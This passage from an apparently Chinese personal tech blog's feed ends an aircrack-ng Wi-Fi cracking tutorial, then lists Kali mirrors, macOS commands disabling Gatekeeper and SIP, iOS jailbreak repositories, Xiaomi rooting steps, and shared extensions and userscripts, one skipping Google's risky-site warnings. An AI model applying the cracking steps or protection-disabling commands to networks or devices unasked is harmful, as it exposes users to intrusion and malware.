30 5C F5 D4 EE BE </span><br></pre></td></tr></table></figure>
<p>根据以上输出，我们已经成功！Wi-Fi 密码是：1234567890</p>
<h2 id="8-无线网卡退出监听模式"><a href="#8-无线网卡退出监听模式" class="headerlink" title="8. 无线网卡退出监听模式"></a>8. 无线网卡退出监听模式</h2><p>使用命令：airmon-ng stop &lt;处于监听模式的无限网卡名称&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon</span><br><span class="line"></span><br><span class="line">PHY Interface Driver    Chipset</span><br><span class="line"></span><br><span class="line">phy0  wlp8s0mon iwlwifi   Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br><span class="line"></span><br><span class="line">    (mac80211 station mode vif enabled on [phy0]wlp8s0)</span><br><span class="line"></span><br><span class="line">    (mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
        <category>aircrackng</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>aircrackng</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 常用命令</title>
    <url>/posts/1a87e8df/</url>
    <content><![CDATA[<p>查看shell类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure>

<p>进入软件源列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>进入编辑模式 i</p>
<p>注释Kali官方源#，增添下面的国内源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#aliyun 阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>Esc退出编辑模式，:wq保存退出</p>
<p>更新可用软件包列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt update </span><br></pre></td></tr></table></figure>
<p>安装&#x2F;升级软件来更新系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt upgrade</span><br></pre></td></tr></table></figure>
<p>卸载&#x2F;安装&#x2F;升级软件来更新系统（会有不兼容风险）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt dist-upgrade</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>macos 常用终端命令</title>
    <url>/posts/6bb3f535/</url>
    <content><![CDATA[<h1 id="恢复“任何来源”选项"><a href="#恢复“任何来源”选项" class="headerlink" title="恢复“任何来源”选项"></a>恢复“任何来源”选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure>
<p>系统设置” -&gt; “安全性与隐私” -&gt; “通用” -&gt; “允许从以下位置下载应用”，选择 “任何来源”</p>
<h1 id="查看、打开、关闭系统完整性保护（SIP）"><a href="#查看、打开、关闭系统完整性保护（SIP）" class="headerlink" title="查看、打开、关闭系统完整性保护（SIP）"></a>查看、打开、关闭系统完整性保护（SIP）</h1><p>在安装软件时，我们经常需要查看SIP的状态，还要打开、关闭SIP，这些都是通过终端完成的。<br>禁用系统完整性保护<br>重启按住Cmd + R， 打开终端应用程序并输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">csrutil <span class="built_in">disable</span> &amp;&amp; reboot</span><br></pre></td></tr></table></figure>
<h1 id="启用系统完整性保护"><a href="#启用系统完整性保护" class="headerlink" title="启用系统完整性保护"></a>启用系统完整性保护</h1><p>重启按住Cmd + R，打开终端应用程序并输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">csrutil <span class="built_in">enable</span> &amp;&amp; reboot</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>自用 crx for chromium 分享</title>
    <url>/posts/bba2b69c/</url>
    <content><![CDATA[<ol>
<li>Noptcha: ReCAPTCHA &amp; hCAPTCHA Solver 机器人自动验证通过</li>
<li>Auto-Refresh-Plus—Page-Monitor.crx</li>
<li>Bark.crx</li>
<li>Convert-Word-to-PDF.crx</li>
<li>CRX-Extractor-Downloader.crx</li>
<li>EditThisCookie.crx</li>
<li>Google-Keep-Chrome-扩展程序.crx</li>
<li>Google-翻译.crx</li>
<li>Grammarly–Grammar-Checker-and-Writing-App.crx</li>
<li>IDM-Integration-Module.crx</li>
<li>IE-Tab.crx</li>
<li>Tampermonkey.crx</li>
<li>捕捉网页截图—FireShot的.crx</li>
<li>图片另存为JPG-PNG-WebP.crx</li>
</ol>
<p>下载链接：<a href="https://wwm.lanzouw.com/b0ea8kk6j">https://wwm.lanzouw.com/b0ea8kk6j</a><br>密码：82fu</p>
]]></content>
      <categories>
        <category>web</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>ios 越狱源推荐</title>
    <url>/posts/a0ec5967/</url>
    <content><![CDATA[<p>收藏保存一些常用的越狱源供大家使用<br>越狱工具官网：</p>
<p><a href="https://unc0ver.dev/">https://unc0ver.dev</a></p>
<p><a href="https://ellekit.space/dopamine/">Dopamine Jailbreak (ellekit.space)</a></p>
<p>越狱成功后，先别急着添加源，在 Cydia 内搜索安装三个基础依赖插件，三款插件均来自自带的 BigBoss 源，千万不要在其他源安装。搜索不到的是因为自带源没刷新出来，换个好点的网络环境重新刷新试试。三款插件名字：</p>
<p>PreferenceLoader</p>
<p>Applist</p>
<p>RocketBootstrap</p>
<p>正规渠道常用源如下：</p>
<p>搬运工源 </p>
<p><a href="https://byg.iosios.net/">https://byg.iosios.net</a></p>
<p>国外知名软件源<br><a href="https://repo.hackyouriphone.org/">https://repo.hackyouriphone.org/</a></p>
<p>iCleaner Pro官方源<br><a href="https://exile90software.com/cydia">https://exile90software.com/cydia</a></p>
<p>Activator官方源<br><a href="https://rpetri.ch/repo">https://rpetri.ch/repo</a></p>
<p>Flex官方源<br><a href="https://getdelta.co/">https://getdelta.co</a></p>
<p>雷锋源<br><a href="https://apt.abcydia.com/">https://apt.abcydia.com</a></p>
<p>app越狱推送<br><a href="https://cydiavip.com/">https://cydiavip.com</a></p>
<p>贴吧源<br><a href="https://apt.cydiaba.cn/">https://apt.cydiaba.cn</a></p>
<p>iosxin源<br><a href="https://iosxin.cc/">https://iosxin.cc</a></p>
<p>ppsspp模拟器<br><a href="https://cydia.ppsspp.org/">https://cydia.ppsspp.org</a></p>
<p>多米诺骨牌<br><a href="https://apt.wxhbts.com/">https://apt.wxhbts.com</a></p>
<p>零秒哥<br><a href="https://cydialmg.vip/">https://cydialmg.vip</a></p>
<p>蔡明美源<br><a href="https://cydia.angelxwind.net/">https://cydia.angelxwind.net</a></p>
<p>触动精灵<br><a href="https://apt.touchsprite.com/">https://apt.touchsprite.com</a></p>
<p>蜜蜂源<br><a href="https://apt.cydiami.com/">https://apt.cydiami.com</a></p>
<p>知网少年<br><a href="https://apt.iphoneba.cn/">https://apt.iphoneba.cn</a></p>
<p>Mrmad Repo<br><a href="https://mrmadtw.github.io/repo">https://Mrmadtw.github.io/repo</a></p>
<p>ibak源<br><a href="https://ibreak.yourepo.com/">https://ibreak.yourepo.com</a></p>
<p>igg<br><a href="https://aquawu.github.io/igg">https://aquawu.github.io/igg</a></p>
<p>老猫<br><a href="https://apt.25mao.com/">https://apt.25mao.com</a></p>
<p><a href="https://apt.nuosike.cn/">https://apt.nuosike.cn/</a></p>
<p><a href="http://apt.dddjb.cn/">http://apt.dddjb.cn</a>   知网少年源</p>
<p><a href="https://apt.margua.top/">https://apt.margua.top</a>  小麻瓜源</p>
<p><a href="https://apt.cydia.bi/">https://apt.cydia.bi</a>   Bi源(搞机源)</p>
<p><a href="https://apt.coolstar.xyz/">https://apt.coolstar.xyz</a>  Alice源</p>
<p><a href="http://repo.cydiabc.top/">http://repo.cydiabc.top</a>   小苹果源</p>
<p><a href="http://h.933k.cn/">http://h.933k.cn</a>   嗨客汉化源</p>
<p><a href="https://repo.netskao.cn/">https://repo.netskao.cn</a>   哥哥源 </p>
<p><a href="https://ibreak.yourepo.com/">https://ibreak.yourepo.com</a>   小姐姐源 </p>
<p><a href="https://yttxcs.com/">https://yttxcs.com</a>   壹筒天下源 </p>
<p><a href="http://apt.ambier.cn/">http://apt.ambier.cn</a>   野心源 </p>
<p><a href="http://apt.ss03.cn/">http://apt.ss03.cn</a>   艾锋源</p>
<p><a href="http://apt.cydiaba.cn/">http://apt.cydiaba.cn</a>   贴吧源</p>
<p><a href="http://apt.xbsite.cn/">http://apt.xbsite.cn</a>   知网小白源 </p>
<p><a href="http://apt.25mao.com/">http://apt.25mao.com</a>   老猫微信源</p>
<p><a href="https://lenglengyu.yourepo.com/">https://lenglengyu.yourepo.com</a>   冷冷雨源 </p>
<p><a href="http://apt.htv123.com/">http://apt.htv123.com</a>   电话助手作者源 </p>
<p><a href="http://apt.thebigboss.org/repofiles/cydia">http://apt.thebigboss.org/repofiles/cydia</a>   大老板源必装  国外源需挂v </p>
<p><a href="http://repo.incendo.ws/">http://repo.incendo.ws</a>   手机端自签证书作者源 </p>
<p><a href="https://pulandres.me/repo/">https://pulandres.me/repo/</a>   国外p老作者源 </p>
<p><a href="https://dada.yourepo.com/">https://dada.yourepo.com</a>   骚达美化源 </p>
<p><a href="https://soda-ldz.yourepo.com/">https://soda-ldz.yourepo.com</a>   苏达微信美化源 </p>
<p><a href="http://tigisoftware.com/cydia/">http://tigisoftware.com/cydia/</a>   文件管理器Filza作者源 </p>
<p><a href="https://c1d3r.com/repo">https://c1d3r.com/repo</a>   分屏作者源 </p>
<p><a href="http://getdelta.co/">http://getdelta.co</a>   （Flex3作者源） </p>
<p><a href="http://ib-soft.net/cydia">http://ib-soft.net/cydia</a>   （iCleaner pro作者源） </p>
<p><a href="http://rpetri.ch/repo">http://rpetri.ch/repo</a>   依赖更新最快  国外源需挂v </p>
<p><a href="https://opa334.github.io/beta">https://opa334.github.io/beta</a>   （Safari Plus作者源） </p>
<p><a href="http://akusio.github.io/">http://akusio.github.io/</a>   多任务分屏多窗口作者源 </p>
<p><a href="http://sutuplus.github.io/repo">http://sutuplus.github.io/repo</a>   苏兔美化源 </p>
<p><a href="https://ryleyangus.com/repo">https://ryleyangus.com/repo</a>   屏蔽越狱检测Liberty lite作者源 </p>
<p><a href="https://opa334.github.io/">https://opa334.github.io</a>   多功能自带浏览器增强safari作者源 </p>
<p><a href="http://repo.nepeta.me/">http://repo.nepeta.me</a>   屏蔽越狱检测unsub作者源 </p>
<p><a href="http://cydia.akemi.ai/">http://cydia.akemi.ai</a>   越狱状态无视证书掉签appsync unifed作者源 </p>
<p><a href="https://repo.chariz.io/">https://repo.chariz.io</a>   必装自带源 </p>
<blockquote>
<p>温馨提醒：<br>三大盗版源大家别去装，容易出问题！！！蚂蚁源，蜜蜂源，cydiaKK源。 </p>
<p>劫持依赖源勿装：雷锋源，多米诺骨牌源，App越狱插件推送。 </p>
<p>垃圾源勿装：刀疤木源 在此告诫越狱的小白们，能尽量用作者源的就尽量用作者源的，这样更新第一时间都会知道，或者第三方正规迁移的正规中文源。 </p>
<p>以上加深内容仅供参考。也不知道从哪传出的上面一段话，然后就大家都搬运复制，但是实际体验下来，像多米诺骨牌源还可以的，大家自行判断吧。</p>
</blockquote>
<p>官方源地址(优先添加官方源)</p>
<p>多巴胺官网源(自带)<br><a href="https://ellekit.space/">https://ellekit.space/</a></p>
<p>opa334巨魔大佬源<br><a href="https://opa334.github.io/">https://opa334.github.io/</a></p>
<p>蜗牛源<br><a href="https://repo.snailovet.com/">https://repo.snailovet.com/</a></p>
<p>AudioRecorder 通话录音官方源<br><a href="http://limneos.net/repo/">http://limneos.net/repo/</a></p>
<p>Shuffle源 插件收纳官方源<br><a href="https://creaturecoding.com/repo/">https://creaturecoding.com/repo/</a></p>
<p>Brend0n源 歌词显示官方源<br><a href="https://brendonjkding.github.io/">https://brendonjkding.github.io/</a></p>
<p>免费砸壳官方源<br><a href="https://alias20.gitlab.io/apt">https://alias20.gitlab.io/apt</a></p>
<p>GinsuDev源 dodo源<br><a href="https://ginsu.dev/repo/">https://ginsu.dev/repo/</a></p>
<p>iCleaner Pro小扫把官方源<br><a href="https://ib-soft.net/cydia/beta/">https://ib-soft.net/cydia/beta/</a><br><a href="https://ib-soft.net/cydia/">https://ib-soft.net/cydia/</a></p>
<p>Netskao源镜像（赵楠）<br><a href="https://invalidunit.github.io/netskao-archive/">https://invalidunit.github.io/netskao-archive/</a></p>
<p>赵楠源（中文）官方源<br><a href="https://invalidunit.github.io/repo/">https://invalidunit.github.io/repo/</a><br><a href="https://invalidunit.github.io/repo2/">https://invalidunit.github.io/repo2/</a></p>
<p>乌其墨墨做的源<br><a href="https://lclrc.github.io/repo/">https://lclrc.github.io/repo/</a></p>
<p>真皮官方源（中文）<br><a href="https://rootless.zq666.eu.org/">https://rootless.zq666.eu.org/</a></p>
<p>SkyPian官方源（中文）<br><a href="https://skypain.github.io/repo/">https://skypain.github.io/repo/</a></p>
<p>NiceiOS官方源（中文）<br><a href="https://repo.niceios.com/">https://repo.niceios.com/</a></p>
<p>电话助手官方源（中文）<br><a href="http://apt.htv123.com/">http://apt.htv123.com/</a></p>
<p>Filza官方源<br><a href="http://tigisoftware.com/cydia/">http://tigisoftware.com/cydia/</a></p>
<p>老猫官方源（中文）<br><a href="https://apt.25mao.com/">https://apt.25mao.com/</a></p>
<p>苏兔官方源<br><a href="https://apt.sutuplus.com/">https://apt.sutuplus.com/</a></p>
<p>刀刀源（原嗨客源）汉化！<br><a href="https://xiangfeidexiaohuo.github.io/">https://xiangfeidexiaohuo.github.io/</a></p>
<p>poomsmart官方源<br><a href="https://poomsmart.github.io/repo/">https://poomsmart.github.io/repo/</a></p>
<p>越南老哥34306官方源<br><a href="https://34306.github.io/">https://34306.github.io</a></p>
<p>FolderX官方源<br><a href="https://lizynz.github.io/">https://lizynz.github.io/</a></p>
<p>CC真后台模块官方源<br><a href="http://akusio.github.io/">http://akusio.github.io</a></p>
<p>Zetsu分屏官方源<br><a href="http://dcsyhi1998.github.io/">http://dcsyhi1998.github.io/</a><br><a href="https://repo.anamy.gay/">https://repo.anamy.gay/</a></p>
<p>Snowboard官方源<br><a href="https://sparkdev.me/">https://sparkdev.me/</a></p>
<p>搬运工源<a href="https://byg.iosios.net/">https://byg.iosios.net/</a></p>
<p>百度主题源<a href="https://zhuti.iosios.net/">https://zhuti.iosios.net/</a></p>
<p>来了老弟源<a href="https://laileld.github.io/repo">https://laileld.github.io/repo</a></p>
<p>wwg135源<a href="https://wwg135.github.io/">https://wwg135.github.io/</a></p>
<p>学习交流源<a href="https://flyx099.github.io/repo/">https://flyx099.github.io/repo/</a></p>
<p>菠萝美化源<a href="https://themepro.yourepo.com/">https://themepro.yourepo.com/</a></p>
<p>H5GG游戏官方源<br><a href="https://apt.h5gg.app/">https://apt.h5gg.app/</a></p>
<p>iGG官方源<br><a href="https://aquawu.github.io/igg/">https://aquawu.github.io/igg/</a></p>
<p>iosgods官方源<br><a href="https://iosgods.com/repo/">https://iosgods.com/repo/</a></p>
<p>其他未分类源</p>
<p><a href="https://huayuarc.cn/">https://huayuarc.cn/</a><br><a href="https://cydia.akemi.ai/">https://cydia.akemi.ai/</a><br><a href="https://repo.mazh.top/">https://repo.mazh.top/</a><br><a href="https://apt.geometricsoftware.se/">https://apt.geometricsoftware.se/</a><br><a href="https://repo.anthopak.dev/">https://repo.anthopak.dev</a><br><a href="https://www.yourepo.com/">https://www.yourepo.com/</a><br><a href="https://julio.hackyouriphone.org/">https://julio.hackyouriphone.org/</a><br><a href="https://0xkuj.yourepo.com/">https://0xkuj.yourepo.com</a><br><a href="https://iosign.tk/">https://iosign.tk/</a><br><a href="https://apt.autotouch.net/rootless">https://apt.autotouch.net/rootless</a><br><a href="http://tigisoftware.com/repo/">http://tigisoftware.com/repo/</a><br><a href="https://liam.page/oldabi/">https://liam.page/oldabi/</a><br><a href="https://cydiageek.yourepo.com/">https://cydiageek.yourepo.com/</a><br><a href="https://miro92.com/repo/">https://miro92.com/repo/</a><br><a href="https://nahtedetihw.github.io/">https://nahtedetihw.github.io/</a><br><a href="https://repo.icrazeios.com/">https://repo.icrazeios.com/</a><br><a href="https://p2kdev.github.io/repo/">https://p2kdev.github.io/repo/</a><br><a href="https://dhinakg.github.io/repo/">https://dhinakg.github.io/repo/</a><br><a href="https://repo.itznebbs.com/">https://repo.itznebbs.com/</a><br><a href="https://0xilis.github.io/rootless/">https://0xilis.github.io/rootless/</a><br><a href="https://ios.jjolano.me/">https://ios.jjolano.me/</a><br><a href="https://repo.ikghd.me/">https://repo.ikghd.me/</a><br><a href="https://cydia.rob311.com/repo/">https://cydia.rob311.com/repo/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>小米手机刷入欧版无广告系统并获取 root</title>
    <url>/posts/6ffa8c01/</url>
    <content><![CDATA[<h1 id="刷欧版系统"><a href="#刷欧版系统" class="headerlink" title="刷欧版系统"></a>刷欧版系统</h1><ol>
<li><p>设置——关于手机——全部参数——点MIUI版本5次——打开开发者模式</p>
</li>
<li><p>更多设置——开发者选项——OEM解锁——绑定小米账号——USB调试 </p>
</li>
<li><p>下载解锁工具<a href="http://www.miui.com/unlock/download.html">解开Bootloader锁</a></p>
</li>
<li><p>下载欧版系统<a href="https://xiaomirom.com/">小米全球系统线刷和卡刷包</a></p>
</li>
<li><p>解压缩系统安装包，运行包内的 flash_all.bat</p>
</li>
<li><p>音量减+电源键同时长按，进入fastboot模式刷入系统</p>
</li>
</ol>
<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><ol>
<li>下载安装<a href="https://wwm.lanzouw.com/ieSll09dncfi">Magisk</a></li>
<li>将安装包里面的images文件夹的boot.img传入手机<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">#A为手机路径，B为电脑路径，意思为：把文件从电脑复制到手机上</span><br><span class="line">adb push &lt;B&gt; &lt;A&gt;</span><br></pre></td></tr></table></figure></li>
<li>安装选择并修补一个文件，选传入手机的boot.img，开始修改内核</li>
</ol>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
        <tag>xiaomi</tag>
      </tags>
  </entry>
  <entry>
    <title>自用 tampermonkey 油猴脚本分享</title>
    <url>/posts/b3b1d9a8/</url>
    <content><![CDATA[<ol>
<li><a href="https://greasyfork.org/zh-TW/scripts/14178-ac-baidu-%E9%87%8D%E5%AE%9A%E5%90%91%E4%BC%98%E5%8C%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%8B%97%E8%B0%B7%E6%AD%8C%E5%BF%85%E5%BA%94%E6%90%9C%E7%B4%A2-favicon-%E5%8F%8C%E5%88%97">AC-baidu-重定向优化百度搜狗谷歌必应搜索_favicon_双列</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/8426-download-youtube-videos-and-subtitles">Download Youtube videos and subtitles</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/24204-picviewer-ce">Picviewer CE+</a></li>
<li><a href="https://zh.savefrom.net/6/user.php?helper=userjs">SaveFrom.net helper</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/401709-%E5%85%8D%E7%99%BB%E5%BD%95%E4%B8%8B%E8%BD%BD%E5%A4%A9%E7%BF%BC%E4%BA%91%E7%9B%98%E5%88%86%E4%BA%AB%E6%96%87%E4%BB%B6">免登录下载天翼云盘分享文件</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/2312-resize-image-on-open-image-in-new-tab">右键在新标签中打开图片时显示最优化图像质量</a></li>
<li><a href="https://www.baiduyun.wiki/tool/install-darkmode.html">夜间模式助手</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/434936-%E5%B1%8F%E8%94%BD%E6%89%80%E6%9C%89youtube%E5%B9%BF%E5%91%8A-youtube-ad-blocker-block-all-ad-including-blocking-youtube-music">屏蔽所有Youtube广告 Youtube AD blocker (Block all ad). Including blocking Youtube Music.</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/27183-%E6%8B%92%E7%BB%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E7%99%BB%E5%BD%95-%E6%B7%98%E5%AE%9D-%E4%BA%AC%E4%B8%9C%E7%AD%89%E7%BD%91%E7%AB%99%E9%BB%98%E8%AE%A4%E5%87%BA%E7%8E%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2">拒绝二维码登录（淘宝、京东等网站默认出现账号密码登录界面）</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/373334-%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93-wenku-%E5%9C%A8%E7%BA%BF%E4%B8%8B%E8%BD%BDpdf%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6">百度文库（wenku）在线下载PDF格式文件</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/418182-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%AE%80%E6%98%93%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B-%E7%9B%B4%E9%93%BE%E4%B8%8B%E8%BD%BD%E5%A4%8D%E6%B4%BB%E7%89%88">百度网盘简易下载助手（直链下载复活版）</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/29762-%E7%BD%91%E7%9B%98%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%86%99%E8%AE%BF%E9%97%AE%E7%A0%81-%E5%A8%81%E5%8A%9B%E5%8A%A0%E5%BC%BA%E7%89%88">网盘自动填写访问码【威力加强版】</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/28497-%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E8%A7%A3%E9%99%A4-%E6%94%B9">网页限制解除(改)</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/30545-html5%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%B7%A5%E5%85%B7">HTML5视频播放工具</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/37951-%E8%B7%B3%E8%BF%87%E8%B0%B7%E6%AD%8C%E7%BD%91%E9%A1%B5%E9%A3%8E%E9%99%A9%E6%8F%90%E9%86%92">跳过谷歌网页风险提醒</a></li>
<li><a href="https://greasyfork.org/zh-CN/scripts/373099-%E9%92%88%E5%AF%B9%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%99%A8%E5%A2%9E%E5%BC%BA%E6%8F%92%E4%BB%B6">针对百度网盘视频播放器增强插件</a></li>
</ol>
]]></content>
      <categories>
        <category>web</category>
        <category>tampermonkey</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>tampermonkey</tag>
      </tags>
  </entry>
  <entry>
    <title>自用系统镜像分享</title>
    <url>/posts/4684bdea/</url>
    <content><![CDATA[<h1 id="Windows-10-企业版-LTSC-21H2-原版集成22年8月份累积更新完整ISO镜像-2022-08-10"><a href="#Windows-10-企业版-LTSC-21H2-原版集成22年8月份累积更新完整ISO镜像-2022-08-10" class="headerlink" title="Windows 10 企业版 LTSC 21H2 原版集成22年8月份累积更新完整ISO镜像 (2022&#x2F;08&#x2F;10)"></a>Windows 10 企业版 LTSC 21H2 原版集成22年8月份累积更新完整ISO镜像 (2022&#x2F;08&#x2F;10)</h1><p>::Windows 10 Enterprise LTSC 21H2 (OS build 19044.1889) x64 AIO Aug 2022 zh-CN<br>链接: <a href="https://pan.baidu.com/s/1aV2ZpCEfvi8VU4cSBnUi_A?pwd=dxte">https://pan.baidu.com/s/1aV2ZpCEfvi8VU4cSBnUi_A?pwd=dxte</a> 提取码: dxte 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="Windows-7-Ultimate-with-Service-Pack-1-x64-DVD-Chinese-Simplified-2011-05-12"><a href="#Windows-7-Ultimate-with-Service-Pack-1-x64-DVD-Chinese-Simplified-2011-05-12" class="headerlink" title="Windows 7 Ultimate with Service Pack 1 (x64) - DVD (Chinese-Simplified) 2011-05-12"></a>Windows 7 Ultimate with Service Pack 1 (x64) - DVD (Chinese-Simplified) 2011-05-12</h1><p><a href="ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/">ED2K</a><br><a href="magnet:?xt=urn:btih:E86414F638E11104248108B155BE9408A8362509&dn=cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso&xl=3420557312">BT种子</a></p>
<h1 id="更多系统访问下面网站"><a href="#更多系统访问下面网站" class="headerlink" title="更多系统访问下面网站"></a>更多系统访问下面网站</h1><p><a href="https://next.itellyou.cn/">https://next.itellyou.cn/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>自用越狱软件分享</title>
    <url>/posts/a1fd8541/</url>
    <content><![CDATA[<h1 id="越狱工具官网"><a href="#越狱工具官网" class="headerlink" title="越狱工具官网"></a>越狱工具官网</h1><p><a href="https://ellekit.space/dopamine/">Dopamine Jailbreak (ellekit.space)</a></p>
<p><a href="https://www.unc0ver.dev/">https://www.unc0ver.dev/</a><br><a href="https://taurine.app/">https://taurine.app/</a><br><a href="https://altstore.io/">https://altstore.io/</a></p>
<h1 id="第三方软件源："><a href="#第三方软件源：" class="headerlink" title="第三方软件源："></a>第三方软件源：</h1><p>搬运工源 <a href="https://byg.iosios.net/">https://byg.iosios.net</a></p>
<p>bigboss <a href="http://apt.thebigboss.org/repofiles/cydia/dists/stable">http://apt.thebigboss.org/repofiles/cydia/dists/stable</a></p>
<p>AAA知网少年 <a href="https://apt.dddjb.cn/">https://apt.dddjb.cn/</a></p>
<p>Limneos Repo <a href="https://limneos.net/repo/">https://limneos.net/repo/</a></p>
<p>Netskao Private Repo <a href="https://repo.initnil.com/">https://repo.initnil.com/</a></p>
<p>Ivano Bilenchi’s Repo <a href="https://exile90software.com/cydia/">https://exile90software.com/cydia/</a></p>
<p>多巴胺官网源(自带)<br><a href="https://ellekit.space/">https://ellekit.space/</a></p>
<p>opa334巨魔大佬源<br><a href="https://opa334.github.io/">https://opa334.github.io/</a></p>
<p>蜗牛源<br><a href="https://repo.snailovet.com/">https://repo.snailovet.com/</a></p>
<p>AudioRecorder 通话录音官方源<br><a href="http://limneos.net/repo/">http://limneos.net/repo/</a></p>
<p>Shuffle源 插件收纳官方源<br><a href="https://creaturecoding.com/repo/">https://creaturecoding.com/repo/</a></p>
<p>Brend0n源 歌词显示官方源<br><a href="https://brendonjkding.github.io/">https://brendonjkding.github.io/</a></p>
<p>免费砸壳官方源<br><a href="https://alias20.gitlab.io/apt">https://alias20.gitlab.io/apt</a></p>
<p>GinsuDev源 dodo源<br><a href="https://ginsu.dev/repo/">https://ginsu.dev/repo/</a></p>
<p>iCleaner Pro小扫把官方源<br><a href="https://ib-soft.net/cydia/beta/">https://ib-soft.net/cydia/beta/</a><br><a href="https://ib-soft.net/cydia/">https://ib-soft.net/cydia/</a></p>
<p>Netskao源镜像（赵楠）<br><a href="https://invalidunit.github.io/netskao-archive/">https://invalidunit.github.io/netskao-archive/</a></p>
<p>赵楠源（中文）官方源<br><a href="https://invalidunit.github.io/repo/">https://invalidunit.github.io/repo/</a><br><a href="https://invalidunit.github.io/repo2/">https://invalidunit.github.io/repo2/</a></p>
<p>乌其墨墨做的源<br><a href="https://lclrc.github.io/repo/">https://lclrc.github.io/repo/</a></p>
<p>真皮官方源（中文）<br><a href="https://rootless.zq666.eu.org/">https://rootless.zq666.eu.org/</a></p>
<p>SkyPian官方源（中文）<br><a href="https://skypain.github.io/repo/">https://skypain.github.io/repo/</a></p>
<p>NiceiOS官方源（中文）<br><a href="https://repo.niceios.com/">https://repo.niceios.com/</a></p>
<p>电话助手官方源（中文）<br><a href="http://apt.htv123.com/">http://apt.htv123.com/</a></p>
<p>Filza官方源<br><a href="http://tigisoftware.com/cydia/">http://tigisoftware.com/cydia/</a></p>
<p>老猫官方源（中文）<br><a href="https://apt.25mao.com/">https://apt.25mao.com/</a></p>
<p>苏兔官方源<br><a href="https://apt.sutuplus.com/">https://apt.sutuplus.com/</a></p>
<p>刀刀源（原嗨客源）汉化！<br><a href="https://xiangfeidexiaohuo.github.io/">https://xiangfeidexiaohuo.github.io/</a></p>
<p>poomsmart官方源<br><a href="https://poomsmart.github.io/repo/">https://poomsmart.github.io/repo/</a></p>
<p>越南老哥34306官方源<br><a href="https://34306.github.io/">https://34306.github.io</a></p>
<p>FolderX官方源<br><a href="https://lizynz.github.io/">https://lizynz.github.io/</a></p>
<p>CC真后台模块官方源<br><a href="http://akusio.github.io/">http://akusio.github.io</a></p>
